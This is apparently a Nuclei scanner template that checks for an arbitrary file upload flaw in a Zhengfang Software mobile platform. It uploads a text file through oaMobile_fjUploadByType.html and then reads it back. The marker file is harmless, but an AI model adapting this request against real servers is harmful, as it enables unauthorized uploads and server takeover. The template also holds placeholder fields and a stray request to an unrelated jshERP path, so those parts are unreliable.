id: zfydxt-fjUploadByType-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 正方软件股份有限公司移动信息服务管理平台存在任意文件上传漏洞。攻击者可通过任意文件上传获取服务器权限。
  reference:
    - https://mp.weixin.qq.com/s/WrDhyx3wOdwMvSwkF-sXOQ
  tags: tags
variables:
  filename: "{{rand_base(6)}}"
http:
  - raw:
      - |-
        POST /zftal-mobile/oaMobile/oaMobile_fjUploadByType.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        Accept: */*
        Content-Length: 457

        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="yhm"

        123
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="zid"

        456
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="sign"

        789
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="file"; filename="{{filename}}.txt"
        Content-Type: text/plain

        zftest
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
      - |+
        GET /jshERP-boot/platformConfig/getPlatform/url HTTP/1.1
        Host: {{Hostname}}

      - |+
        GET /zftal-mobile/oaFjUploadByType/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - zftest
